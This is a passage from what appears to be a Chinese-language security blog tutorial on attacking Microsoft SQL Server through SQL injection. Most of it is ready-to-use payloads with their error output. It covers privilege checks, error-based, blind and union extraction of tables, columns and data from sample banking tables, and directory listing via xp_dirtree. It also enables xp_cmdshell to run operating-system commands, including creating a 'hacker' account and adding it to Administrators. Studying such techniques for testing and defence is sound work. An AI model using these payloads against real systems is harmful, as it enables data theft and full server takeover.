<li>这些角色控制着整个服务器的权限和功能，如安全设置、备份操作、服务器级别配置等。</li>
</ul>
</li>
<li>数据库级别角色：<ul>
<li>数据库级别角色是定义在特定数据库中的一组角色。</li>
<li>这些角色控制着数据库中对象的访问权限，如表、视图、存储过程等。</li>
<li>数据库级别角色与服务器级别角色的作用范围不同，主要关注数据库内部的权限控制。</li>
</ul>
</li>
</ol>
<h4 id="服务器级别"><a href="#服务器级别" class="headerlink" title="服务器级别"></a>服务器级别</h4><p><img src="/./../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20241206194113814-1733485276606-10.png" alt="image-20241206194113814"></p>
<p>我们可以用<code>IS_SRVROLEMEMBER</code>来判断服务器级别的固定角色</p>
<p><code>IS_SRVROLEMEMBER</code> 是一个系统函数，用于检查指定登录名是否属于指定的服务器级别的固定角色。我们可以利用这个函数的role的有效值去判断服务器级别的固定角色</p>
<table>
<thead>
<tr>
<th>返回值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>login 不是 role 的成员。</td>
</tr>
<tr>
<td>1</td>
<td>login 是 role 的成员。</td>
</tr>
<tr>
<td>NULL</td>
<td>role 或 login 无效，或者没有查看角色成员身份的权限。</td>
</tr>
</tbody></table>
<p>然后我们构造语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and 1=(select is_srvrolemember(&#x27;sysadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;serveradmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;setupadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;securityadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;diskadmin&#x27;))</span><br><span class="line">and 1=(select is_srvrolemember(&#x27;bulkadmin&#x27;))</span><br></pre></td></tr></table></figure>

<p><code>is_srvrolemember</code> 函数需要传入两个参数，即固定角色名和登录名。</p>
<p>在 SQLMap 中使用 –is-dba 命令可以判断是否为管理员权限，即服务器级别的固定角色</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id =1 AND 5560 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (IS_SRVROLEMEMBER(CHAR(115)+CHAR(121)+CHAR(115)+CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110))=1) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(120)+CHAR(113)))</span><br></pre></td></tr></table></figure>

<h4 id="数据库级别"><a href="#数据库级别" class="headerlink" title="数据库级别"></a>数据库级别</h4><p><img src="/./../image/achieve/202411/sql%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA/image-20241206194907105-1733485750110-12.png" alt="image-20241206194907105"></p>
<p>数据库级别的应用角色用<code>IS_ROLEMEMBER</code>函数判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_owner&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_securityadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_accessadmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_backupoperator&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_ddladmin&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_datawriter&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_datareader&#x27;))--</span><br><span class="line">?id=1 and 1=(select IS_ROLEMEMBER(&#x27;db_denydatawriter&#x27;))--</span><br></pre></td></tr></table></figure>

<p>讲完了这个我们再来了解一下基本信息</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SELECT</span> <span class="comment">@@</span>version; <span class="comment">//版本</span></span><br><span class="line"><span class="built_in">SELECT</span> user;		<span class="comment">//用户</span></span><br><span class="line"><span class="built_in">SELECT</span> <span class="built_in">DB_NAME</span>();	<span class="comment">//当前数据库名，你可以用db_name(n)来遍历出所有的数据库</span></span><br><span class="line"><span class="built_in">SELECT</span> <span class="comment">@@</span>servername;	<span class="comment">//主机名</span></span><br></pre></td></tr></table></figure>

<p>那么站库分离可以这么来判断</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> host_name()<span class="operator">=</span>@<span class="variable">@servername</span>;<span class="comment">--&#x27;</span></span><br></pre></td></tr></table></figure>

<p>站库分离的话实际上就是站点和数据库各司其职，二者互相独立，提高系统性能和可维护性</p>
<h3 id="常见符号"><a href="#常见符号" class="headerlink" title="常见符号"></a>常见符号</h3><p>1.注释符号</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">/**/</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>双斜杠是用来注释单行代码的，而&#x2F;**&#x2F;是用于注释多行代码的</p>
<p>2.空白字符</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格字符（%<span class="number">20</span>）</span><br><span class="line">制表符<span class="string">\t</span></span><br><span class="line">换行符<span class="string">\n</span></span><br><span class="line">回车符<span class="string">\r</span></span><br></pre></td></tr></table></figure>

<p>3.运算符</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&amp;位与逻辑运算符，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为<span class="number">1</span>时，结果中的位才被设置为<span class="number">1</span>，否则，结果中的位被设置为<span class="number">0</span></span><br><span class="line">|位或逻辑运算符，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为<span class="number">1</span>时，结果的位就被设置为<span class="number">1</span>，只有当两个位的值都为<span class="number">0</span>时，结果中的位才被设置为<span class="number">0</span></span><br><span class="line">^位异或逻辑运算符，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为<span class="number">1</span>时，结果中的位就被设置为<span class="number">1</span>；只有当两个位的值都为<span class="number">0</span>或<span class="number">1</span>时，结果中的位才被设置为<span class="number">0</span></span><br><span class="line"></span><br><span class="line">ALL 如果一组的比较都为<span class="literal">true</span>，则比较结果为<span class="literal">true</span></span><br><span class="line">AND 如果两个布尔表达式都为<span class="literal">true</span>，则结果为<span class="literal">true</span>；如果其中一个表达式为<span class="literal">false</span>，则结果为<span class="literal">false</span></span><br><span class="line">ANY 如果一组的比较中任何一个为<span class="literal">true</span>，则结果为<span class="literal">true</span></span><br><span class="line">BETWEEN 如果操作数在某个范围之内，那么结果为<span class="literal">true</span></span><br><span class="line">EXISTS  如果子查询中包含了一些行，那么结果为<span class="literal">true</span></span><br><span class="line">IN  如果操作数等于表达式列表中的一个，那么结果为<span class="literal">true</span></span><br><span class="line">LIKE    如果操作数与某种模式相匹配，那么结果为<span class="literal">true</span></span><br><span class="line">NOT 对任何其他布尔运算符的结果值取反</span><br><span class="line">OR  如果两个布尔表达式中的任何一个为<span class="literal">true</span>，那么结果为<span class="literal">true</span></span><br><span class="line">SOME    如果在一组比较中，有些比较为<span class="literal">true</span>，那么结果为<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="基本注入流程"><a href="#基本注入流程" class="headerlink" title="基本注入流程"></a>基本注入流程</h3><p>爆破当前数据库</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Fanmv_Admin WHERE <span class="attribute">AdminID</span>=1 <span class="keyword">and</span> DB_NAME()&gt;1;</span><br><span class="line">?<span class="attribute">id</span>=1&#x27;and db_name()&gt;0;--</span><br></pre></td></tr></table></figure>

<p>为什么这个可以爆出来呢</p>
<p>这里利用mssql数据类型不一样的报错情况，在将 nvarchar 值 ‘FanmvCMS’ 转换成数据类型 int 时失败。从而把数据库爆出来</p>
<p>爆破表名</p>
<p>在将 nvarchar 值 ‘Fanmv_Admin’ 转换成数据类型 int 时失败。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 name from sysobjects WHERE xtype=&#x27;u&#x27;);</span><br><span class="line">查询表的完整步骤</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27;);--</span><br><span class="line">//旨在返回数据库中第一个用户表的名称。</span><br><span class="line">//然后通过不断调整查询条件的name not in(&#x27;table_name&#x27;)，逐步排除已知表名去拿到我们想找的表名</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;));--</span><br><span class="line">(&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;, &#x27;fsb_messages&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;, &#x27;fsb_messages&#x27;, &#x27;fsb_transactions&#x27;));--</span><br><span class="line">?id=1 and 1=(select top 1 name from sysobjects where xtype=&#x27;u&#x27; and name not in (&#x27;fsb_accounts&#x27;, &#x27;fsb_fund_transfers&#x27;, &#x27;fsb_loan_rates&#x27;, &#x27;fsb_messages&#x27;, &#x27;fsb_transactions&#x27;, &#x27;fsb_users&#x27;));-</span><br></pre></td></tr></table></figure>

<p>爆破字段名</p>
<p>在将 nvarchar 值 ‘AdminID’ 转换成数据类型 int 时失败。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;Fanmv_Admin&#x27;));</span><br><span class="line">查询字段名的具体步骤</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;));--</span><br><span class="line">//尝试从sysobjects中获取fsb_accounts的ID，然后从syscolumns中获取该表的第一个字段名</span><br><span class="line">//然后逐步排除字段找到我们想要的字段名</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;) and name&lt;&gt;&#x27;account_no&#x27;);--</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;) and name&lt;&gt;&#x27;account_no&#x27; and name&lt;&gt;&#x27;account_type&#x27;);--</span><br><span class="line">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name = &#x27;fsb_accounts&#x27;) and name&lt;&gt;&#x27;account_no&#x27; and name&lt;&gt;&#x27;account_type&#x27; and name&lt;&gt;&#x27;balance_amount&#x27;);--</span><br></pre></td></tr></table></figure>

<p>爆破数据</p>
<p>在将 varchar 值 ‘81FAAEN52MA16VBYT4Y1JJ3552BTC1640E7CF84345C86BA6’ 转换成数据类型 int 时失败。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Fanmv_Admin WHERE AdminID=1 and 1=(SELECT TOP 1 AdminPass from Fanmv_Admin);</span><br><span class="line">查询数据的具体步骤</span><br><span class="line">?id=1 and 1=(select top 1 branch from fsb_accounts);--</span><br><span class="line">//尝试从表 fsb_accounts 中获取第一个 branch 列的值。通过 select top 1 子句，它只返回结果集中的第一个值。</span><br><span class="line">?id=1 and 1=(select top 1 branch from fsb_accounts where branch&lt;&gt;&#x27;Texas-Remington Circle&#x27;);--</span><br><span class="line">//排除了 branch 列值为 &#x27;Texas-Remington Circle&#x27; 的记录，只返回除此之外的第一个 branch 列的值。</span><br><span class="line">?id=1 and 1=(select top 1 branch from fsb_accounts where branch not in (&#x27;Texas-Remington Circle&#x27;, &#x27;Mahnattan - New york&#x27;));--</span><br><span class="line">//除了排除 &#x27;Texas-Remington Circle&#x27; 外，还排除了 &#x27;Mahnattan - New york&#x27;，然后返回除这两个值之外的第一个 branch 列的值。</span><br></pre></td></tr></table></figure>

<p>当然，在mssql中除了借助 <code>sysobjects</code> 表和 <code>syscolumns</code> 表获取表名、列名外，MSSQL 数据库中也兼容 <code>information_schema</code>，里面存放了数据表表名和字段名。使用方法与 MySQL 相同。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* 查询表名可以用 information_schema.tables */</span><br><span class="line">?id=1 and 1=(select top 1 table_name from information_schema.tables);--</span><br><span class="line">/* 查询列名可以用 information_schema.columns */</span><br><span class="line">?id=1 and 1=(select top 1 column_name from information_schema.columns where table_name=&#x27;fsb_accounts&#x27;);--</span><br></pre></td></tr></table></figure>

<p>我们要判断当前的表名和列名，也可以用<code>having 1=1</code> 和 <code>group by</code></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Fanmv_Admin WHERE <span class="attribute">AdminID</span>=1 having <span class="attribute">1</span>=1</span><br></pre></td></tr></table></figure>

<p>选择列表中的列 ‘Fanmv_Admin.AdminID’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<p>爆出一列，将其用group by 拼接进去继续往后爆其他的</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Fanmv_Admin <span class="keyword">WHERE</span> AdminID=<span class="number">1</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> AdminID <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>选择列表中的列 ‘Fanmv_Admin.IsSystem’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Fanmv_Admin <span class="keyword">WHERE</span> AdminID=<span class="number">1</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> AdminID,IsSystem <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>选择列表中的列 ‘Fanmv_Admin.AdminName’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。</p>
<p>以此爆出所有字段</p>
<h3 id="mssql报错注入"><a href="#mssql报错注入" class="headerlink" title="mssql报错注入"></a>mssql报错注入</h3><p>其实上面已经讲到了报错注入的一些基本用法，但是这里还是得把概念理清楚</p>
<p>MSSQL 数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。前提是服务器允许返回报错信息。报错注入利用的就是显式或隐式的类型转换来报错</p>
<p>先看隐式报错</p>
<p>隐式报错（Implicit Error）是指在代码执行过程中发生错误，但这些错误并不会显式地抛出异常或产生明确的错误消息。相反，这些错误可能会导致程序出现不可预料的行为或结果</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> id =<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">user</span>)&gt;<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>user和0进行比较时因为数据类型不一致就会报错</p>
<p>再看显式报错，显式报错（Explicit Error）是指通过有意设置错误条件来产生错误消息的情况。</p>
<p>一般显式报错中我们会用<code>cast</code>和<code>convert</code>函数去有意的设置错误条件达到报错注入的目的</p>
<p>在SQL中，CAST和CONVERT函数都用于将一个数据类型转换为另一个数据类型</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> id =<span class="number">1</span> (<span class="keyword">select</span> CAST(<span class="keyword">USER</span> <span class="keyword">as</span> <span class="type">int</span>))</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> id =<span class="number">1</span> (<span class="keyword">select</span> convert(<span class="type">int</span>,<span class="keyword">user</span>))</span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>其实和mysql的一样，通过设置判断条件并通过页面的回显信息去判断条件是否符合来达到注入的效果</p>
<p>布尔盲注</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">and</span> ascii(substring((<span class="keyword">select</span> top <span class="number">1</span> <span class="type">name</span> <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)) &gt;= <span class="number">109</span></span><br></pre></td></tr></table></figure>

<p>布尔盲注没有mssql那么多姿势，大同小异截取字符串比较，通过判断条件去拿到真实的内容</p>
<p>时间盲注</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>;<span class="keyword">if</span> (<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))=<span class="number">1</span> waitfor delay <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br><span class="line">?id=<span class="number">1</span>;<span class="keyword">if</span> (ascii(substring((<span class="keyword">select</span> top <span class="number">1</span> <span class="type">name</span> <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)))&gt;<span class="number">1</span> waitfor delay <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><code>waitfor delay &#39;0:0:5&#39;</code>是mssql的延时语法</p>
<p>但是mssql的盲注还是相对来说简单很多的</p>
<h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>mssql不用数字占位，因为可能会发生隐式转换，我们用null来占位</p>
<p>在mysql中，爆数据库我们通常是这样去做的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,database()#</span><br></pre></td></tr></table></figure>

<p>但是在mssql中我们就得稍微变一下</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,DB_NAME();</span><br><span class="line">也可以通过这样去联合报错</span><br><span class="line">?id=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>, (<span class="keyword">select</span> CAST(db_name() <span class="keyword">as</span> <span class="type">int</span>))</span><br></pre></td></tr></table></figure>

<p>在mssql中我们如果想查询多条数据可以使用%2B 也就是加号</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="type">name</span>%<span class="number">2</span>Bpass,<span class="keyword">null</span> <span class="keyword">from</span> <span class="keyword">info</span></span><br></pre></td></tr></table></figure>

<h3 id="getshell和提权"><a href="#getshell和提权" class="headerlink" title="getshell和提权"></a>getshell和提权</h3><h4 id="1-getshell"><a href="#1-getshell" class="headerlink" title="1.getshell"></a>1.getshell</h4><p>getshell也就涉及到了权限的问题，能否getshell要看你当前的用户权限，如果是没有进行降权的sa用户，那么你几乎可以做任何事。它数据库权限是<code>db_owner</code>，当然你如果有其他具有do_owner权限的用户也可以。</p>
<p>所以我们getshell的两大前提:</p>
<ul>
<li>有相应的权限db_owner</li>
<li>知道web目录的绝对路径</li>
</ul>
<p>那我们先讲一下怎么拿到目录的绝对路径</p>
<h5 id="1-1寻找绝对路径"><a href="#1-1寻找绝对路径" class="headerlink" title="1.1寻找绝对路径"></a>1.1寻找绝对路径</h5><p>寻找绝对目录一般有以下几个思路</p>
<ol>
<li><p>报错寻找 </p>
</li>
<li><p>字典猜</p>
</li>
<li><p>旁站信息收集</p>
</li>
<li><p>调用储存过程来搜索</p>
</li>
<li><p>读配置文件</p>
</li>
</ol>
<p>前三种方法都是比较常见的方法。我们主要来讲第四种调用存储过程来搜索。</p>
<p>在mssql中有两个存储过程可以帮我们来找绝对路径：<code>xp_cmdshell xp_dirtree</code></p>
<p>我们一个个进行讲解</p>
<ul>
<li>xp_dirtree</li>
</ul>
<p>在SQL Server中，xp_dirtree是一个扩展存储过程，用于从指定路径中检索所有子文件和子目录的列表。它返回一个结果集，其中包含指定路径下所有子文件和子目录的详细信息。</p>
<p>以下是xp_dirtree的一般用法：</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execute master..xp_dirtree &#x27;c:&#x27; --列出所有c:\文件、目录、子目录 <span class="built_in"></span></span><br><span class="line"><span class="built_in">execute </span>master..xp_dirtree &#x27;c:&#x27;,1 --只列c:\目录<span class="built_in"></span></span><br><span class="line"><span class="built_in">execute </span>master..xp_dirtree &#x27;c:&#x27;,1,1 --列c:\目录、文件</span><br></pre></td></tr></table></figure>

<p>那么我们怎么利用呢，执行xp_dirtree返回我们传入的参数如果你想把文件名一起返回来，因为没有回显所以可以这样创建一个临时的表插入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1;CREATE TABLE tmp (dir varchar(8000),num int,num1 int);</span><br><span class="line">//创建一个临时表tmp，该表包含三列：dir用于存储文件或目录的路径，num和num1用于存储相关的数字信息。</span><br><span class="line">?id=1;insert into tmp(dir,num,num1) execute master..xp_dirtree &#x27;c:&#x27;,1,1</span><br><span class="line">//INSERT INTO语句执行了master..xp_dirtree存储过程，并将其结果插入到之前创建的表tmp中。</span><br><span class="line">//参数1和1分别是用于指示是否要处理子目录以及返回文件和目录的深度的参数。</span><br></pre></td></tr></table></figure>

<ul>
<li>xp_cmdshell</li>
</ul>
<p><code>xp_cmdshell</code> 存储过程可以生成并执行 Windows 命令，任何输出都作为文本返回。<code>xp_cmdshell</code> 功能非常强大，但是从 MSSQL 2005 版本之后默认处于禁用状态，可以执行 <code>sp_configure</code> 来启用或禁用 <code>xp_cmdshell</code>。</p>
<p><code>xp_cmdshell</code> 的利用条件如下：</p>
<ul>
<li>• 当前用户具有 DBA 权限</li>
<li>• 依赖于 xplog70.dll</li>
<li>• <code>xp_cmdshell</code> 存储过程存在并已启用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/* 判断当前是否为 DBA 权限，返回 1 则可以提权 */</span><br><span class="line">SELECT IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;);</span><br><span class="line"></span><br><span class="line">/* 查看是否存在 xp_cmdshell，返回 1 则存在 */</span><br><span class="line">SELECT COUNT(*) FROM master.dbo.sysobjects WHERE xtype=&#x27;x&#x27; AND name=&#x27;xp_cmdshell&#x27;</span><br><span class="line"></span><br><span class="line">/* 开启 xp_cmdshell */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line"></span><br><span class="line">/* 关闭 xp_cmdshell */</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure>

<p>一般的用法(执行命令)</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">EXEC xp_cmdshell <span class="string">&#x27;dir c:&#x27;</span></span><br><span class="line"><span class="function"><span class="title">EXEC</span></span> master..xp_cmdshell <span class="string">&#x27;dir c:&#x27;</span></span><br><span class="line"><span class="function"><span class="title">EXEC</span></span> master..xp_cmdshell <span class="string">&#x27;ipconfig/all&#x27;</span></span><br><span class="line"><span class="function"><span class="title">EXEC</span></span> master..xp_cmdshell <span class="string">&#x27;systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;&#x27;</span></span><br><span class="line"><span class="function"><span class="title">EXEC</span></span> master..xp_cmdshell <span class="string">&#x27;reg query HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal&quot; &quot;ServerWinStationsRDP-Tcp /v PortNumber&#x27;</span></span><br><span class="line"><span class="function"><span class="title">EXEC</span></span> master..xp_cmdshell <span class="string">&#x27;net user hacker Passw0rd /add&#x27;</span>,NO_OUTPUT</span><br><span class="line"><span class="function"><span class="title">EXEC</span></span> master..xp_cmdshell <span class="string">&#x27;net localgroup Administrators hacker /add&#x27;</span>,NO_OUTPUT</span><br></pre></td></tr></table></figure>

<p>接下来我们先来看cmd中怎么查找文件。</p>
